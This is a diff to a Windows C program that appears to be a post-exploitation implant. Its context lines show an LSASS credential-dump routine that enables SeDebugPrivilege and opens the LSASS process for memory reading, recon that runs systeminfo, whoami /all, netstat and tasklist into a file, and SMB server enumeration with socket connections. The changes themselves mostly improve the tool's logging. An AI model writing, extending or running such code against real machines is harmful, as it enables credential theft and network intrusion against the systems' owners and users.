@@ -301,9 +301,10 @@ static void DumpLSASS(void) {
     if (!lsassPid) { LogMessage(L"[-] LSASS dump FAILED"); return; }
 
     if (!EnableDebugPrivilege()) {
-        LogMessage(L"[-] LSASS dump FAILED: cannot enable SeDebugPrivilege");
+        LogMessage(L"[-] EnableDebugPrivilege FAILED");
         return;
     }
+    LogMessage(L"[+] SeDebugPrivilege enabled");
 
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
     if (!hProcess) { LogMessage(L"[-] LSASS dump FAILED"); return; }
@@ -487,16 +488,16 @@ static void DoRecon(void) {
 
         AppendToFile(RECON_PATH, "=== SYSTEM INFO ===");
         RunAndCapture(L"systeminfo", RECON_PATH);
-        LogMessage(L"[+] Recon command executed");
+        LogMessage(L"[+] Recon: systeminfo completed");
         AppendToFile(RECON_PATH, "=== WHOAMI ===");
         RunAndCapture(L"whoami /all", RECON_PATH);
-        LogMessage(L"[+] Recon command executed");
+        LogMessage(L"[+] Recon: whoami completed");
         AppendToFile(RECON_PATH, "=== NETSTAT ===");
         RunAndCapture(L"netstat -ano", RECON_PATH);
-        LogMessage(L"[+] Recon command executed");
+        LogMessage(L"[+] Recon: netstat completed");
         AppendToFile(RECON_PATH, "=== TASKLIST ===");
         RunAndCapture(L"tasklist /v", RECON_PATH);
-        LogMessage(L"[+] Recon command executed");
+        LogMessage(L"[+] Recon: tasklist completed");
 
         AppendToFile(RECON_PATH, "=== USER NAME ===");
         HMODULE hSecur32 = GetModuleHandleW(L"secur32");
@@ -513,7 +514,7 @@ static void DoRecon(void) {
                 }
             }
         }
-        LogMessage(L"[+] Recon command executed");
+        LogMessage(L"[+] Recon: GetUserNameExW completed");
 
         // Win32 API recon
         AppendToFile(RECON_PATH, "=== NETWORK ADAPTERS ===");
@@ -582,7 +583,10 @@ static void DoSMBRecon(void) {
         DeleteFileW(NET_PATH);
 
         WSADATA wsaData;
-        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;
+        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+            LogMessage(L"[-] DoSMBRecon: WSAStartup FAILED");
+            return;
+        }
 
         LPBYTE pServers = NULL;
         DWORD dwEntries = 0, dwTotal = 0;
@@ -648,7 +652,15 @@ static void DoSMBRecon(void) {
                             LogMessage(connMsg);
                         }
                         closesocket(sock);
+                    } else {
+                        wchar_t connMsg[256];
+                        wsprintfW(connMsg, L"[-] DoSMBRecon: socket() FAILED for %s", pInfo[i].sv100_name);
+                        LogMessage(connMsg);
                     }
+                } else {
+                    wchar_t connMsg[256];
+                    wsprintfW(connMsg, L"[-] DoSMBRecon: gethostbyname FAILED for %s", pInfo[i].sv100_name);
+                    LogMessage(connMsg);
                 }
             }
             NetApiBufferFree(pServers);
